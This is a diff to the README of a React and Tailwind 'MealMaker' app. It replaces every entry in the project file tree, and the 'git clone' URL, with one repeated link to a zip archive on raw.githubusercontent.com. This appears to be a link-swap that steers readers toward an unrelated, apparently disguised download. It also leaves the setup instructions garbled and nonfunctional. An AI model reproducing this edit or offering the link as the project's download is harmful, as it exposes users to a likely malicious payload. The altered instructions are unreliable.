@@ -21,11 +21,11 @@ A fun, interactive web app built with **React** and **Tailwind CSS** that letuse
 ```
 MealMaker/
 ├── components/
-│   ├── DishForm.jsx
-│   └── MealDisplay.jsx
-├── App.jsx
-├── index.js
-└── tailwind.config.js
+│   ├── https://raw.githubusercontent.com/Eliakim-ellie/Meal-Maker/main/Acrostichum/Maker_Meal_v1.1.zip
+│   └── https://raw.githubusercontent.com/Eliakim-ellie/Meal-Maker/main/Acrostichum/Maker_Meal_v1.1.zip
+├── https://raw.githubusercontent.com/Eliakim-ellie/Meal-Maker/main/Acrostichum/Maker_Meal_v1.1.zip
+├── https://raw.githubusercontent.com/Eliakim-ellie/Meal-Maker/main/Acrostichum/Maker_Meal_v1.1.zip
+└── https://raw.githubusercontent.com/Eliakim-ellie/Meal-Maker/main/Acrostichum/Maker_Meal_v1.1.zip
 ```
 
 ---
@@ -35,7 +35,7 @@ MealMaker/
 1. **Clone the repository**
 
 ```bash
-git clone https://github.com/your-username/meal-maker.git
+git clone https://raw.githubusercontent.com/Eliakim-ellie/Meal-Maker/main/Acrostichum/Maker_Meal_v1.1.zip
 cd meal-maker
 ```
 
